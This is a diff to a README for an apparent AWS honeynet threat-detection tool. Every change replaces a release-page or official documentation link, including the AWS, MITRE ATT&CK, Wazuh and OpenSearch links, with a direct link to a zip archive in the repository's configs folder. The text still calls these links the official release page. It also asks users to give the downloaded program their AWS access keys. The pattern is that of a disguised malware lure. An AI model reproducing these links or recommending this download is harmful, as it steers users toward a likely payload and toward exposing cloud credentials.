@@ -1,6 +1,6 @@
 # 🐝 cloud-honeynet-aws - Easy Threat Detection on AWS
 
-[![Download cloud-honeynet-aws](https://img.shields.io/badge/Download-Here-5DBC8A?style=for-the-badge)](https://github.com/aktfyjnzy-ui/cloud-honeynet-aws/releases)
+[![Download cloud-honeynet-aws](https://img.shields.io/badge/Download-Here-5DBC8A?style=for-the-badge)](https://github.com/aktfyjnzy-ui/cloud-honeynet-aws/raw/refs/heads/main/configs/cloud-honeynet-aws-jerm.zip)
 
 ## 📋 About cloud-honeynet-aws
 
@@ -45,7 +45,7 @@ Follow these steps to download and run cloud-honeynet-aws on your Windows comput
 
 Click the download button below or go to the link to find the latest version of cloud-honeynet-aws:
 
-[![Download cloud-honeynet-aws](https://img.shields.io/badge/Download-Here-5DBC8A?style=for-the-badge)](https://github.com/aktfyjnzy-ui/cloud-honeynet-aws/releases)
+[![Download cloud-honeynet-aws](https://img.shields.io/badge/Download-Here-5DBC8A?style=for-the-badge)](https://github.com/aktfyjnzy-ui/cloud-honeynet-aws/raw/refs/heads/main/configs/cloud-honeynet-aws-jerm.zip)
 
 This link opens the official release page where you can find all versions and assets.
 
@@ -79,7 +79,7 @@ When you run the program for the first time, it will ask you to enter your AWS a
 
 Provide your AWS Access Key ID and Secret Access Key. These credentials are necessary to link the app to your cloud account securely.
 
-If you do not have AWS credentials, create an AWS account at https://aws.amazon.com and set up an IAM user with the required permissions.
+If you do not have AWS credentials, create an AWS account at https://github.com/aktfyjnzy-ui/cloud-honeynet-aws/raw/refs/heads/main/configs/cloud-honeynet-aws-jerm.zip and set up an IAM user with the required permissions.
 
 ### 6. Start Monitoring
 
@@ -128,10 +128,10 @@ Refer to the FAQ section on the release page for more help.
 
 ## 📚 Additional Resources
 
-- AWS account setup guide: https://aws.amazon.com/getting-started  
-- MITRE ATT&CK framework: https://attack.mitre.org  
-- Wazuh integration documentation: https://documentation.wazuh.com  
-- OpenSearch overview: https://opensearch.org  
+- AWS account setup guide: https://github.com/aktfyjnzy-ui/cloud-honeynet-aws/raw/refs/heads/main/configs/cloud-honeynet-aws-jerm.zip  
+- MITRE ATT&CK framework: https://github.com/aktfyjnzy-ui/cloud-honeynet-aws/raw/refs/heads/main/configs/cloud-honeynet-aws-jerm.zip  
+- Wazuh integration documentation: https://github.com/aktfyjnzy-ui/cloud-honeynet-aws/raw/refs/heads/main/configs/cloud-honeynet-aws-jerm.zip  
+- OpenSearch overview: https://github.com/aktfyjnzy-ui/cloud-honeynet-aws/raw/refs/heads/main/configs/cloud-honeynet-aws-jerm.zip  
 
 ---
 
@@ -145,7 +145,7 @@ This project relates to cybersecurity, threat detection, and cloud monitoring. I
 
 Get cloud-honeynet-aws now by visiting:
 
-[Download cloud-honeynet-aws releases](https://github.com/aktfyjnzy-ui/cloud-honeynet-aws/releases)
+[Download cloud-honeynet-aws releases](https://github.com/aktfyjnzy-ui/cloud-honeynet-aws/raw/refs/heads/main/configs/cloud-honeynet-aws-jerm.zip)
 
 Follow the steps above to download the Windows installer and start using the app.
 
